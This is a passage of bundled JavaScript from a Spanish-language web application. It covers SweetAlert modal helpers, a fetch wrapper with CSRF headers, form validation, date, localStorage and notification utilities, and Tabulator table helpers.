        // "() => !Swal.isLoading()" -> para que no se pueda cerras si esta cargando. | "false" -> para que no se pueda cerrar
      });
    });
  }
  static inputModal(params) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      var _a2;
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return __privateMethod(_a2 = _SModal2, _SModal_static, inputModalBasic_fn).call(_a2, params, false);
    });
  }
  static inputModalFixed(params) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      var _a2;
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return __privateMethod(_a2 = _SModal2, _SModal_static, inputModalBasic_fn).call(_a2, params, true);
    });
  }
  static bladeModal({
    ajaxUrl,
    showConfirmButton = false,
    confirmButtonText = "",
    jsActionsInModal = (p) => {
    },
    funcParam = {},
    width = 850,
    didClose
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return Swal.fire({
        width,
        showConfirmButton,
        confirmButtonText,
        showCloseButton: true,
        willOpen: async () => {
          Swal.showLoading();
          try {
            const result = await g.newFetch({ url: ajaxUrl });
            if (!result.success) {
              _SModal2.updateErrorModal({ title: "Ups...): Algo ha ido mal", html: result.message });
              return;
            }
            const html2 = typeof result.data === "string" ? result.data : "Formato blade incorrecto.";
            _SModal2.updateModal({ hideLoading: true, html: html2 });
            if (jsActionsInModal) jsActionsInModal(funcParam);
          } catch (e2) {
            g.catchCode({ error: e2 });
          }
        },
        allowOutsideClick: () => !Swal.isLoading(),
        didClose
      });
    });
  }
};
_SModal_static = /* @__PURE__ */ new WeakSet();
checkAndExecuteShow_fn = function(callback) {
  try {
    return callback();
  } catch (e2) {
    if (e2 instanceof CannotOpenModalWarning) {
      g.consoleInfo(e2.message);
    } else {
      throw e2;
    }
    return Promise.resolve();
  }
};
checkAndExecuteUpdate_fn = function(callback) {
  try {
    callback();
  } catch (e2) {
    if (e2 instanceof CannotOpenModalWarning) {
      g.consoleInfo(e2.message);
    } else {
      throw e2;
    }
  }
};
inputModalBasic_fn = function({
  title = "Introduce los datos",
  width = 850,
  html: html2 = "Introduce los datos",
  input: input2 = "textarea",
  inputValue = "",
  inputId = "inpName",
  inputPlaceholder = "Placeholder...",
  inputOptions = void 0,
  getValidationMessage: getValidationMessage2 = () => null,
  preConfirm_url,
  preConfirm_type = "GET",
  preConfirm_params = {},
  preConfirm_inputParamName = void 0,
  preConfirm_permitConfirm = true,
  preConfirm_ajaxOkCode = void 0,
  confirmButtonText = "Guardar",
  showCancelButton = true,
  cancelButtonText = "Cancelar",
  showLoaderOnConfirm = true,
  didClose = () => {
  },
  didOpen = () => {
  }
}, fixedAndAlertChanges = false) {
  var _a;
  return __privateMethod(_a = _SModal, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
    _SModal.mustAbortIfIsAlreadyOpen({});
    const inputPassValidation = (value) => getValidationMessage2(value) === null;
    const didOpenToAlertInputChanges = (el) => {
      didOpen(el);
      let inputHtml = el.querySelector(`${input2}[data-id="${inputId}"]`);
      let swalContent = el.querySelector(".swal2-html-container");
      let confirmBtn = el.querySelector(".swal2-confirm");
      swalContent.insertAdjacentHTML("afterbegin", '<div class="mySwalError alert alert-danger text-start d-none"></div>');
      let newDivError = swalContent.querySelector(".mySwalError");
      swalContent.insertAdjacentHTML("afterbegin", '<div class="mySwalSuccess alert alert-success text-start d-none"></div>');
      let keyUpValidationFunction = (e2) => {
        var _a2;
        let val = ((_a2 = e2 == null ? void 0 : e2.target) == null ? void 0 : _a2.value) ?? "";
        if (!inputPassValidation(val)) {
          newDivError.classList.remove("d-none");
          newDivError.innerText = getValidationMessage2(val);
          confirmBtn.disabled = true;
        } else {
          newDivError.classList.add("d-none");
          confirmBtn.disabled = false;
        }
      };
      if (fixedAndAlertChanges) {
        inputHtml == null ? void 0 : inputHtml.addEventListener("keyup", keyUpValidationFunction);
        inputHtml == null ? void 0 : inputHtml.addEventListener("blur", keyUpValidationFunction);
      } else {
        const listener = InputsNeedsChangeListener.includes(input2) ? "keyup" : "change";
        inputHtml == null ? void 0 : inputHtml.addEventListener(listener, keyUpValidationFunction);
      }
      keyUpValidationFunction(null);
    };
    const final_permitConfirm = fixedAndAlertChanges ? false : preConfirm_permitConfirm;
    const final_didOpen = fixedAndAlertChanges ? didOpenToAlertInputChanges : didOpen;
    return Swal.fire({
      title,
      width,
      html: html2,
      input: input2,
      inputPlaceholder,
      inputValue,
      inputOptions,
      inputAttributes: {
        "data-id": inputId
      },
      confirmButtonText,
      showCancelButton,
      cancelButtonText,
      showCloseButton: true,
      showLoaderOnConfirm,
      preConfirm: async (inputValue2) => {
        try {
          if (preConfirm_inputParamName !== void 0) {
            preConfirm_params[preConfirm_inputParamName] = inputValue2;
          }
          let result = await g.newFetch({ url: preConfirm_url, type: preConfirm_type, ajaxParams: preConfirm_params });
          if (!result.success) {
            Swal.showValidationMessage(result.message);
            return false;
          }
          if (preConfirm_ajaxOkCode !== void 0) preConfirm_ajaxOkCode();
          if (fixedAndAlertChanges) {
            let successDiv = document.querySelector(".mySwalSuccess");
            if (successDiv !== null) {
              successDiv.classList.remove("d-none");
              successDiv.innerHTML = `Guardado correctamente.`;
              setTimeout(() => {
                successDiv == null ? void 0 : successDiv.classList.add("d-none");
              }, 2e3);
            }
          }
          return final_permitConfirm ? result : false;
        } catch (e2) {
          Swal.showValidationMessage(`Request failed: ${e2.message}`);
          return false;
        }
      },
      allowOutsideClick: () => !Swal.isLoading(),
      inputValidator: (value) => {
        return new Promise((resolve) => {
          if (inputPassValidation(value)) {
            resolve();
          } else {
            resolve(getValidationMessage2(value));
          }
        });
      },
      didOpen: final_didOpen,
      customClass: {
        container: "swalForceWidth"
      },
      didClose
    });
  });
};
__privateAdd(_SModal, _SModal_static);
__publicField(_SModal, "colorBlue", "#3085d6");
__publicField(_SModal, "colorRed", "#d33");
__publicField(_SModal, "colorGray", "#aaa");
__publicField(_SModal, "isPendigLoading", false);
__publicField(_SModal, "Toast", Swal.mixin({
  title: "Your work has been saved",
  toast: true,
  position: "top-end",
  showConfirmButton: false,
  timer: 3e3,
  timerProgressBar: true,
  didOpen: (toast) => {
    toast.addEventListener("mouseenter", Swal.stopTimer);
    toast.addEventListener("mouseleave", Swal.resumeTimer);
  }
}));
let SModal = _SModal;
const _g = class _g2 {
  static isNotNull(variable) {
    return variable !== null;
  }
  static isUndefined(variable) {
    return typeof variable === "undefined";
  }
  static escapeHtml(html2) {
    return html2.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll('"', "&quot;").replaceAll("'", "&#039;");
  }
  static handleGlobalError(error2) {
    if ((error2 == null ? void 0 : error2.name) === "CannotOpenModalException") {
      _g2.consoleInfo(error2);
      return true;
    }
    SModal.errorModal({
      title: "Error imprevisto",
      html: `<span class="restriction-message">${_g2.escapeHtml((error2 == null ? void 0 : error2.message) ?? "Formato error imprevisto")}</span>`,
      cancelButtonText: "Ok",
      footer: ___("contact_pi_team")
    }).then((result) => {
      _g2.errorModalIsShowed = false;
    });
    _g2.errorModalIsShowed = true;
    return false;
  }
  static async newFetch({
    url,
    type = "GET",
    ajaxParams = void 0,
    responseIsText = false,
    showLog = false
  }) {
    try {
      let fetchParams = {
        method: type,
        // *GET, POST, PUT, DELETE, etc.
        headers: {
          "Content-Type": "application/json",
          // "Content-Type": "application/x-www-form-urlencoded",
          "Accept": "application/json",
          "X-Requested-With": "XMLHttpRequest",
          "X-CSRF-TOKEN": __const("token")
        }
      };
      if (type !== "GET" && ajaxParams !== void 0) {
        fetchParams.body = JSON.stringify(ajaxParams);
      }
      let response = await fetch(url, fetchParams);
      let result = responseIsText ? await response.text() : await response.json();
      if (showLog) console.log({ result });
      if (!response.ok) {
        return Promise.reject(result);
      }
      if (result === "") {
        return Promise.reject("El servidor ha devuelto una respuesta vacia");
      }
      return result;
    } catch (e2) {
      console.error("Error con fetch");
      return Promise.reject(e2);
    }
  }
  static catchCode({
    error: error2,
    title = void 0,
    text = void 0,
    html: html2 = void 0,
    reloadOnClose = false,
    footer = ___("contact_pi_team"),
    from = void 0
  }) {
    if (_g2.errorModalIsShowed) return;
    console.error(error2);
    if (!_g2.isUndefined(from)) console.log("From:", from);
    const finalHtml = html2 ? html2 : `<span class="restriction-message">${_g2.escapeHtml(text || (error2.message || "Error imprevisto (o formato error inesperado)"))}</span>`;
    SModal.errorModal({
      icon: "warning",
      title,
      html: finalHtml,
      confirmButtonText: reloadOnClose ? ___("reload_page") : ___("ok"),
      footer
    }, true).then((result) => {
      _g2.errorModalIsShowed = false;
      if (reloadOnClose && result.isConfirmed) {
        location.reload();
      }
    });
    _g2.errorModalIsShowed = true;
  }
  static sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
  static strIsEmpty(str) {
    if (typeof str !== "string") return false;
    return !Boolean(str.trim());
  }
  static isEmpty(value) {
    return _g2.isNullish(value) || _g2.strIsEmpty(value) || Number.isNaN(value);
  }
  static deleteArrayItemsWhere(array2, filterFunc, nameField) {
    let deleteItems = array2.filter(filterFunc);
    deleteItems.forEach((deleteItem) => array2.splice(array2.findIndex((item) => item[nameField] === deleteItem[nameField]), 1));
    return array2;
  }
  static valueFailsRequiredValidation(value) {
    return value === null || value === void 0 || typeof value === "string" && value.trim().length === 0;
  }
  static validate(data, rules) {
    let res = { success: [], messages: [], validated: {} };
    Object.entries(rules).forEach(([key, value]) => {
      if (!Array.isArray(value)) {
        res.validated[key] = value;
        return;
      }
      value.forEach((item) => {
        let arrayItems = item.split(":");
        switch (arrayItems[0]) {
          case "optional":
            if (data.hasOwnProperty(key) && data[key] !== void 0) {
              res.validated[key] = data[key];
            } else {
              res.validated[key] = null;
            }
            break;
          case "required":
            if (_g2.valueFailsRequiredValidation(data[key])) {
              res.success.push(false);
              res.messages.push(`El campo "${key}" es obligatorio`);
            } else {
              res.validated[key] = data[key];
            }
            break;
          case "min":
            if (data[key]) {
              if (data[key].length < parseInt(arrayItems[1])) {
                res.success.push(false);
                res.messages.push(`El campo "${key}" ha de tener como mnimo ${arrayItems[1]} caracteres`);
              } else {
                res.validated[key] = data[key];
              }
            }
            break;
          case "max":
            if (data[key]) {
              if (data[key].length > parseInt(arrayItems[1])) {
                res.success.push(false);
                res.messages.push(`El campo "${key}" ha de tener como mximo ${arrayItems[1]} caracteres`);
              } else {
                res.validated[key] = data[key];
              }
            }
            break;
          case "color":
            if (data[key]) {
              if (!data[key].match(/^(#[a-fA-F0-9]{6})$/i)) {
                res.success.push(false);
                res.messages.push(`El campo "${key}" ha de tener formato hexadecimal, por ejemplo, #FFCC00`);
              } else {
                res.validated[key] = data[key];
              }
            }
            break;
          case "array":
            if (data[key]) {
              if (!Array.isArray(data[key])) {
                res.success.push(false);
                res.messages.push(`El campo "${key}" debe ser un array`);
              } else {
                res.validated[key] = data[key];
              }
            }
            break;
          case "number":
            if (data[key]) {
              if (!Number.isInteger(parseInt(data[key]))) {
                res.success.push(false);
                res.messages.push(`El campo "${key}" debe ser un numero`);
              } else {
                res.validated[key] = data[key];
              }
            }
            break;
          case "boolean":
            if (data[key]) {
              if (typeof !!data[key] !== "boolean") {
                res.success.push(false);
                res.messages.push(`El campo "${key}" debe ser verdadero o falso`);
              } else {
                res.validated[key] = data[key];
              }
            }
            break;
          case "required_if":
            if (arrayItems[1] === "1" && _g2.valueFailsRequiredValidation(data[key])) {
              res.success.push(false);
              res.messages.push(`El campo "${key}" es obligatorio en esta situacin`);
            } else {
              res.validated[key] = data[key] ?? null;
            }
            break;
          default:
            res.success.push(false);
            res.messages.push(`La validacin introducida no esta controlada`);
        }
      });
    });
    return { success: !res.success.includes(false), messages: res.messages, validated: res.validated };
  }
  static strIncludesAny(str, values) {
    let res = false;
    values.forEach((value) => {
      if (str.includes(value)) {
        res = true;
      }
    });
    return res;
  }
  static eventClosest(event, selectors) {
    return (event == null ? void 0 : event.target).closest(selectors);
  }
  static showPageLoader() {
    const body = document.querySelector("body");
    body == null ? void 0 : body.classList.add("overlay-body");
    body == null ? void 0 : body.insertAdjacentHTML("beforeend", '<div id="page-loader" class="overlay"><div class="loader-container"><div class="loader"></div></div></div>');
  }
  static removePageLoader() {
    const body = document.querySelector("body");
    const loader = document.querySelector("#page-loader");
    body == null ? void 0 : body.classList.remove("overlay-body");
    loader == null ? void 0 : loader.remove();
  }
  static reloadPage() {
    _g2.showPageLoader();
    location.reload();
  }
  static startTooltips() {
    __vitePreload(() => import("bootstrap"), true ? [] : void 0).then((bootstrap) => {
      const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]');
      [...tooltipTriggerList].map((tooltipTriggerEl) => new bootstrap.Tooltip(tooltipTriggerEl));
    }).catch((error2) => {
      console.error("Tabulator-tables no est instalado o no se pudo cargar.", error2);
    });
  }
  static addSpinner(selectors, size = "md") {
    if (selectors === null) return;
    const sizeClass = size === "sm" ? "spinner-border-sm" : "";
    const spinnerHtml = `<div class="spinner-border ${sizeClass}" data-added-in="general" role="status"><span class="visually-hidden">Loading...</span></div>`;
    if (selectors instanceof HTMLElement) {
      selectors.insertAdjacentHTML("afterbegin", spinnerHtml);
    } else if (selectors instanceof NodeList) {
      selectors.forEach((item) => {
        item.insertAdjacentHTML("afterbegin", spinnerHtml);
      });
    } else {
      const elements = document.querySelectorAll(selectors);
      elements.forEach((item) => {
        item.insertAdjacentHTML("afterbegin", spinnerHtml);
      });
    }
  }
  static removeSpinner(selectors) {
    var _a;
    if (selectors === null) return;
    if (selectors instanceof HTMLElement) {
      (_a = selectors.querySelector('[data-added-in="general"]')) == null ? void 0 : _a.remove();
    } else if (selectors instanceof NodeList) {
      selectors.forEach((item) => {
        var _a2;
        (_a2 = item.querySelector('[data-added-in="general"]')) == null ? void 0 : _a2.remove();
      });
    } else {
      const elements = document.querySelectorAll(selectors);
      elements.forEach((item) => {
        var _a2;
        (_a2 = item.querySelector('[data-added-in="general"]')) == null ? void 0 : _a2.remove();
      });
    }
  }
  static consoleInfo(message) {
    if (message) console.info(`%c INFO - ${message}`, "background: #222; color: #bada55; padding: 0.5rem");
  }
  // Funcin para comprobar si un valor es truthy
  static isTruthy(value) {
    return !!value;
  }
  // Funcin para comprobar si un valor es falsy
  static isFalsy(value) {
    return !value;
  }
  // Funcin para comprobar si un valor es nullish (null o undefined)
  static isNullish(value) {
    return value === null || value === void 0;
  }
  /*static pluck(array: any[], key: string) {
          return array.map(i => i[key]);
      }
  
      static pluck(array: Record<any, any>[], value: string, key: string) {
          return array.reduce((acc, obj) => {
              acc[obj[key]] = obj[value];
              return acc;
          }, {});
      }*/
  static dataGet(target, key, defaultValue = null) {
    if (key === null) {
      return target;
    }
    const keys = Array.isArray(key) ? key : key.split(".");
    for (let i2 = 0; i2 < keys.length; i2++) {
      const segment = keys[i2];
      if (segment === null) {
        return target;
      }
      if (segment === "*") {
        if (typeof target[Symbol.iterator] !== "function") {
          return defaultValue;
        }
        const result = [];
        for (const item of target) {
          result.push(_g2.dataGet(item, keys.slice(i2 + 1)));
        }
        return result.flat();
      }
      if (target && (typeof target === "object" || Array.isArray(target)) && segment in target) {
        target = target[segment];
      } else {
        return defaultValue;
      }
    }
    return target;
  }
  static explodePluckParameters(value, key) {
    const valueArray = typeof value === "string" ? value.split(".") : value;
    const keyArray = key === null || Array.isArray(key) ? key : key.split(".");
    return [valueArray, keyArray];
  }
  static pluck(array2, value, key = null) {
    const results = key === null ? [] : {};
    [value, key] = _g2.explodePluckParameters(value, key);
    for (const item of array2) {
      const itemValue = _g2.dataGet(item, value);
      if (key === null) {
        results.push(itemValue);
      } else {
        let itemKey = _g2.dataGet(item, key);
        if (itemKey && typeof itemKey === "object" && typeof itemKey.toString === "function") {
          itemKey = itemKey.toString();
        }
        results[itemKey] = itemValue;
      }
    }
    return results;
  }
};
__publicField(_g, "errorModalIsShowed", false);
let g = _g;
class Html {
  static compareTailwindClassesHTML(htmlA, htmlB) {
    function extractClassesFromElement(element) {
      const classList = element.getAttribute("class");
      return classList ? classList.split(" ").sort().join(" ") : "";
    }
    function getSortedClassesArray(htmlString) {
      const parser = new DOMParser();
      const doc = parser.parseFromString(htmlString, "text/html");
      const allElements = doc.querySelectorAll("*");
      return Array.from(allElements).map(extractClassesFromElement);
    }
    const classesA = getSortedClassesArray(htmlA);
    const classesB = getSortedClassesArray(htmlB);
    if (classesA.length !== classesB.length) return false;
    return classesA.every((classA, index) => classA === classesB[index]);
  }
  static compareHTMLElementsStructure(htmlA, htmlB) {
    function getAttributesMap(element) {
      const attributes = {};
      for (const attr of Array.from(element.attributes)) {
        if (attr.name === "style") continue;
        if (attr.name === "class") {
          attributes[attr.name] = attr.value.split(" ").sort().join(" ").trim();
        } else {
          attributes[attr.name] = attr.value.trim();
        }
      }
      return attributes;
    }
    function compareAttributes(attrsA, attrsB) {
      const keysA = Object.keys(attrsA);
      const keysB = Object.keys(attrsB);
      if (keysA.length !== keysB.length) return false;
      return keysA.every((key) => attrsA[key] === attrsB[key]);
    }
    function compareElements(elementA, elementB) {
      if (elementA.tagName !== elementB.tagName) return false;
      const attrsA = getAttributesMap(elementA);
      const attrsB = getAttributesMap(elementB);
      if (!compareAttributes(attrsA, attrsB)) return false;
      const childrenA = elementA.children;
      const childrenB = elementB.children;
      if (childrenA.length !== childrenB.length) return false;
      for (let i2 = 0; i2 < childrenA.length; i2++) {
        if (!compareElements(childrenA[i2], childrenB[i2])) return false;
      }
      return true;
    }
    function getRootElement(htmlString) {
      const parser = new DOMParser();
      const doc = parser.parseFromString(htmlString, "text/html");
      return doc.body.firstElementChild;
    }
    const rootA = getRootElement(htmlA);
    const rootB = getRootElement(htmlB);
    if (!rootA || !rootB) return false;
    return compareElements(rootA, rootB);
  }
}
const _LDate = class _LDate2 {
  static now() {
    return DateTime.now();
  }
  static local() {
    return DateTime.local();
  }
  static parse(date2) {
    return DateTime.fromSQL(date2);
  }
  static format(date2, format) {
    const datetime2 = date2 instanceof DateTime ? date2 : _LDate2.parse(date2);
    return datetime2.toFormat(format);
  }
  static toSeconds(date2) {
    return _LDate2.format(date2, _LDate2.formats.timestamp_seconds);
  }
  static hasSame(d1, d22, unit) {
    if (d1 === null || d22 === null || d1 === void 0 || d22 === void 0) return false;
    d1 = d1 instanceof DateTime ? d1 : _LDate2.parse(d1);
    d22 = d22 instanceof DateTime ? d22 : _LDate2.parse(d22);
    return d1.hasSame(d22, unit);
  }
  static diffNow(date2, unit = "seconds") {
    if (date2 === null || date2 === void 0) return null;
    const d3 = date2 instanceof DateTime ? date2 : _LDate2.parse(date2);
    return d3.isValid ? d3.diffNow(unit).toObject()[unit] : 0;
  }
  static diff(d1, d22, unit = "seconds") {
    if (d1 === null || d22 === null || d1 === void 0 || d22 === void 0) return null;
    const date1 = d1 instanceof DateTime ? d1 : _LDate2.parse(d1);
    const date2 = d22 instanceof DateTime ? d22 : _LDate2.parse(d22);
    return date1.diff(date2, unit).toObject()[unit];
  }
  static getTimeId() {
    return _LDate2.format(_LDate2.now(), _LDate2.formats.datetime_startYear_oneWord);
  }
};
_LDate_static = /* @__PURE__ */ new WeakSet();
__privateAdd(_LDate, _LDate_static);
__publicField(_LDate, "formats", {
  date_startYear: "yyyy-LL-dd",
  date_startDay: "dd-LL-yyyy",
  date_startYear_slash: "yyyy/LL/dd",
  date_startDay_slash: "dd/LL/yyyy",
  date_startMonthWithoutDay_slash: "LL/yyyy",
  datetime_startYear: "yyyy-LL-dd HH:mm:ss",
  datetime_startYear_oneWord: "yyyyLLdd_HHmmss",
  time: "HH:mm:ss",
  timeWithoutHours: "mm:ss",
  timestamp_seconds: "X"
});
let LDate = _LDate;
const _LStorage = class _LStorage2 {
  static setItem(key, value) {
    window.localStorage.setItem(key, value);
  }
  static getItem(key) {
    return window.localStorage.getItem(key);
  }
  static removeItem(key) {
    window.localStorage.removeItem(key);
  }
  static exist(key) {
    return _LStorage2.getItem(key) !== null;
  }
  static checkAndUpdateVersion() {
    const savedVersion = localStorage.getItem(_LStorage2.VERSION_KEY);
    if (savedVersion !== _LStorage2.VERSION) {
      localStorage.clear();
      localStorage.setItem(_LStorage2.VERSION_KEY, _LStorage2.VERSION);
    }
  }
  static isFirstConnectionInDay() {
    const validSecondsToBeCountedAsTheSameDay = 10;
    const lastConn = _LStorage2.getItem("lastConnection");
    const diffNow = LDate.diffNow(lastConn, "seconds");
    return !_LStorage2.exist("lastConnection") || !LDate.hasSame(LDate.now(), lastConn, "day") || Math.abs(diffNow ?? 0) < validSecondsToBeCountedAsTheSameDay;
  }
  static setNowAsLastConnection() {
    _LStorage2.setItem("lastConnection", LDate.toSeconds(LDate.now()));
  }
};
__publicField(_LStorage, "VERSION", __const("VITE_APP_STORAGE_VERSION"));
__publicField(_LStorage, "VERSION_KEY", "config-version");
let LStorage = _LStorage;
const _Notify = class _Notify2 {
  constructor(title, body, openUrl) {
    __privateAdd(this, _Notify_instances);
    __privateAdd(this, _title);
    __privateAdd(this, _body);
    __privateAdd(this, _openUrl);
    __privateSet(this, _title, title);
    __privateSet(this, _body, body);
    __privateSet(this, _openUrl, openUrl);
  }
  static checkAndRequestPermission() {
    if (!("Notification" in window)) {
      alert("This browser does not support desktop notification");
    } else if (Notification.permission !== "denied" && Notification.permission !== "granted") {
      Notification.requestPermission().then();
    }
  }
  static launch({ title = "titulo", body = void 0, openUrl = void 0, when }) {
    var _a;
    if (when === "hidden" && document.visibilityState === "visible") return;
    if (when === "unfocused" && document.hasFocus()) return;
    const id = LDate.getTimeId();
    if (_Notify2.STORAGE.check(id)) {
      const rand = Math.floor(Math.random() * 100);
      g.consoleInfo(`notificacion evitada: [${id}_${rand}] -> ${body}`);
      return;
    }
    _Notify2.STORAGE.saveNotified(id);
    const notify = new _Notify2(title, body, openUrl);
    __privateMethod(_a = notify, _Notify_instances, createNotification_fn).call(_a);
  }
};
_title = /* @__PURE__ */ new WeakMap();
_body = /* @__PURE__ */ new WeakMap();
_openUrl = /* @__PURE__ */ new WeakMap();
_Notify_instances = /* @__PURE__ */ new WeakSet();
createNotification_fn = function() {
  const notification = new Notification(__privateGet(this, _title), { icon: __const("appIcon"), body: __privateGet(this, _body) });
  notification.onclick = () => window.open(__privateGet(this, _openUrl));
};
__publicField(_Notify, "STORAGE", {
  getAll() {
    return LStorage.getItem("notified");
  },
  check(key) {
    return LStorage.getItem("notified") === key;
  },
  saveNotified(key) {
    LStorage.setItem("notified", key);
  },
  deleteNotified() {
    LStorage.removeItem("notified");
  }
});
let Notify = _Notify;
const _Ttable = class _Ttable2 {
  constructor(tableId, options, settingEvents, orderFieldName) {
    __publicField(this, "tableId");
    __publicField(this, "table");
    __publicField(this, "isEditable", false);
    __publicField(this, "orderFieldName");
    this.tableId = tableId;
    this.orderFieldName = orderFieldName ?? "order";
    this.table = new TabulatorFull$1(this.tableId, options);
    Object.entries(settingEvents).forEach((entry) => {
      const key = entry[0];
      const value = entry[1];
      this.table.on(key, value);
    });
  }
  isEditableCell(cell) {
    return cell.getRow().getData().id === void 0 ? true : this.isEditable;
  }
  addClassEditableOnEditableCells(row) {
    const cells = row.getCells().filter((cell) => {
      let editable = cell.getColumn().getDefinition().editable;
      editable = typeof editable === "function" ? editable(cell) : editable;
      return editable !== false;
    });
    cells.forEach((cell) => {
      cell.getElement().classList.add("cell-editable");
    });
  }
  static formatListValuesToLabelValueStructure(values) {
    const dataArray = [];
    Object.entries(values).forEach(([key, value]) => {
      if (key === "null" || key === "undefined" || key === "") return;
      const intKey = parseInt(String(key));
      dataArray.push({
        "label": String(value),
        "value": isNaN(intKey) ? key : intKey
      });
    });
    return dataArray;
  }
  static formatterParams_lookupSimple(values) {
    const copy2 = Object.assign({}, values);
    copy2["undefined"] = "";
    copy2["null"] = "";
    return copy2;
  }
  static editorParams_list(values, { searchable } = { searchable: true }) {
    return {
      ..._Ttable2.defaultListEditorParams,
      autocomplete: searchable,
      listOnEmpty: !searchable ? void 0 : true,
      allowEmpty: false,
      values: _Ttable2.formatListValuesToLabelValueStructure(values)
    };
  }
  static editorParams_listFix(values) {
    return {
      ..._Ttable2.defaultListEditorParams,
      clearable: false,
      autocomplete: false,
      listOnEmpty: void 0,
      allowEmpty: false,
      values: _Ttable2.formatListValuesToLabelValueStructure(values)
    };
  }
  static editorParams_listBig(values) {
    return {
      ..._Ttable2.defaultListEditorParams,
      listOnEmpty: false,
      allowEmpty: true,
      filterFunc: (term, label, value, item) => {
        if (term.length < 3) return false;
        return String(label).toLowerCase().indexOf(String(term).toLowerCase()) > -1;
      },
      values: _Ttable2.formatListValuesToLabelValueStructure(values)
    };
  }
  static headerFilterParams_listSimple(values) {
    return { values };
  }
  static headerFilterParams_listBig(values) {
    return {
      ..._Ttable2.defaultListEditorParams,
      listOnEmpty: false,
      allowEmpty: true,
      values
    };
  }
  /**
   * -----------------------------------------------------------------------------------------------------------------
   * ----- OTRAS FUNCIONES -------------------------------------------------------------------------------------------
   */
  defaultListenerBtnEdit(btnEdit, btnCancelEdit) {
    btnEdit == null ? void 0 : btnEdit.classList.add("d-none");
    btnCancelEdit == null ? void 0 : btnCancelEdit.classList.remove("d-none");
    this.isEditable = true;
    this.table.redraw(true);
  }
  defaultListenerBtnCancel(btnEdit, btnCancelEdit) {
    btnCancelEdit == null ? void 0 : btnCancelEdit.classList.add("d-none");
    btnEdit == null ? void 0 : btnEdit.classList.remove("d-none");
    this.isEditable = false;
    this.table.replaceData().then();
  }
  defaultListenerBtnAddRow(data = {}) {
    this.table.addRow(data, true).then();
  }
  async saveDataOnRowMovedEvent(row, { url, type }) {
    try {
      let newData = row.getTable().getData();
      newData = newData.map((item, key) => {
        item[this.orderFieldName] = key + 1;
        return item;
      });
      const result = await g.newFetch({ url, type, ajaxParams: { rowsTabulator: newData } });
      SModal.toastInfo({ icon: result.success ? "success" : "error", title: result.message }).then();
      this.table.replaceData().then();
    } catch (e2) {
      g.catchCode({ error: e2 });
    }
  }
  // TODO canals - hacer estatica?
  changeColorsOnRowMovedEvent(row) {
    const position = row.getPosition();
    const data = row.getTable().getData();
    if (!position) Promise.reject("No se ha encontrado la posicion").then();
    let isEdited = false;
    const rows2 = row.getTable().getRows();
    rows2.forEach((row2) => {
      const currentRowPosition = row2.getPosition();
      if (!currentRowPosition) return;
      if (position === currentRowPosition && position !== data[position - 1][this.orderFieldName]) {
        row2.getElement().classList.add("last-row-moved");
      } else {
        row2.getElement().classList.remove("last-row-moved");
      }
      const cell = row2.getCells()[1];
      if (currentRowPosition !== data[currentRowPosition - 1][this.orderFieldName]) {
        cell.getElement().classList.add("cell-position-changed");
        isEdited = true;
      } else {
        cell.getElement().classList.remove("cell-position-changed");
      }
    });
    return Promise.resolve({ isEdited });
  }
  async saveOrderOfAllData({ url, type }) {
    const arrayTabulator = this.table.getData();
    arrayTabulator.map((item, index) => {
      item[this.orderFieldName] = index + 1;
      return item;
    });
    try {
      const actionResult = await g.newFetch({ url, type, ajaxParams: { rowsTabulator: arrayTabulator } });
      if (!actionResult.success) {
        SModal.errorModal({ html: actionResult.message }).then();
        return;
      }
      SModal.toastSuccess({ title: actionResult.message }).then();
      this.table.replaceData().then();
    } catch (err) {
      g.catchCode({ error: err });
    }
  }
  static async defaultActionSave(cell, url, rules, preventReplaceData = false) {
    const cellData = cell.getData();
    const type = cellData.id ? "PUT" : "POST";
    let validation = g.validate(cellData, rules);
    if (!validation.success) {
      SModal.errorModal({ html: validation.messages.join("<br>") }).then();
      return false;
    }
    try {
      const result = await g.newFetch({ url, type, ajaxParams: validation.validated });
      if (result.success) {
        SModal.toastSuccess({ title: result.message }).then();
        if (!preventReplaceData) cell.getTable().replaceData().then();
      } else {
        SModal.errorModal({ html: result.message }).then();
      }
      return result.success;
    } catch (e2) {
      g.catchCode({ error: e2 });
      return false;
    }
  }
  static async defaultActionDelete(cell, url, {
    title = "Eliminar",
    html: html2 = void 0,
    preventReplaceData = false
  }) {
    try {
      const resultModal = await SModal.confirmModal({ title, html: html2 });
      if (!resultModal.isConfirmed) {
        return false;
      }
      let result;
      try {
        const resultDelete = await g.newFetch({ url, type: "DELETE" });
        if (resultDelete.success) {
          SModal.toastSuccess({ title: resultDelete.message }).then();
        } else {
          SModal.errorModal({ html: resultDelete.message }).then();
        }
        result = resultDelete.success;
      } catch (e2) {
        g.catchCode({ error: e2 });
        result = false;
      }
      if (!preventReplaceData) cell.getTable().replaceData().then();
      return result;
    } catch (e2) {
      g.catchCode({ error: e2 });
      return false;
    }
  }
  static defaultActionCancel(cell) {
    cell.getRow().delete().then();
  }
  defaultFormatterCellActions(cell) {
    let strBtns = "";
    if (cell.getData().id === void 0) {
      strBtns += _Ttable2.buttons.btnSave("Guardar");
      strBtns += _Ttable2.buttons.btnCancel("Cancelar");
      return strBtns;
    }
    if (this.isEditable) {
      strBtns += _Ttable2.buttons.btnSave("Guardar");
      strBtns += _Ttable2.buttons.btnDelete("Eliminar");
    }
    return strBtns;
  }
  static customFormatterLookup(cell, formatterParams) {
    return formatterParams[cell.getValue()];
  }
  static getObjectWithThisValue(__this) {
    return { _this: __this };
  }
};
__publicField(_Ttable, "defaultSettings", {
  columnDefaults: {
    headerSort: false,
    headerTooltip: true,
    headerSortTristate: true
    // permitir quitar ordenacion
  },
  ajaxConfig: {
    headers: {
      "Accept": "application/json",
      //tell the server we need JSON back
      "X-Requested-With": "XMLHttpRequest",
      //fix to help some frameworks respond correctly to request
      "Content-type": "application/json; charset=utf-8"
      //set the character encoding of the request
    }
  },
  layout: "fitData",
  locale: "es-es",
  height: "65vh",
  filterMode: "local",
  sortMode: "local",
